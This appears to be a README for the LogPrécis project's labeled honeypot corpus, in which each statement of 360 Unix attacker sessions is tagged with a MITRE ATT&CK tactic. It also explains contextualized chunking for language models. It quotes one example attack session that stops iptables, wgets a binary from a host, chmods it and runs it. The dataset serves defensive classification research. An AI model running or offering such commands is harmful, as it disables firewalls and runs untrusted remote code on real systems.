# HaaS supervised corpus

## Corpus
This folder contains 360 session from the [Honeypot as a Service](https://haas.nic.cz/) collection. The data were labeled under the supervision of a team of experts such that each statement (i.e., chunk of a Unix session separated by ";", "|", "||" or "&&") is assigned a [Mitre Tactic](https://attack.mitre.org/tactics/enterprise/).

For instance, the session:

```shell
etc/init.d/iptables stop ; wget –c http://10.10.10.10:8080/exec ; chmod 777 exec ; ./exec ;
```
Contains 4 statements and is labeled as following:
`Impact -- Execution -- Execution -- Execution`

## Contributing

Sessions were chosen in order to be representative of the Mitre Classes. Still, we welcome contributions from the community to enhance LogPrécis further. If you have any ideas, bug reports, or feature requests, please contact our team at [matteo.boffa@polito.it](mailto:matteo.boffa@polito.it) and [idilio.drago@unito.it](mailto:idilio.drago@unito.it).

## Chunking
LMs can handle strings of fixed size and maximum lenght: if that threshold is exceded, the model simply discard the exceeding text.
To avoid that, NLP experts thought about **chunking**. Chunking here means manually truncating the input text into chunks smaller than the threshold, so that no truncations can occur. 

Particularly, we here use a **contextualized chunking**: that means, each chunks also contain parts of the following and previous chunks, so that the local context is preserved.

The notebook we present serves this purpose: it takes as input a non-curated corpus, and creates chunks when necessary.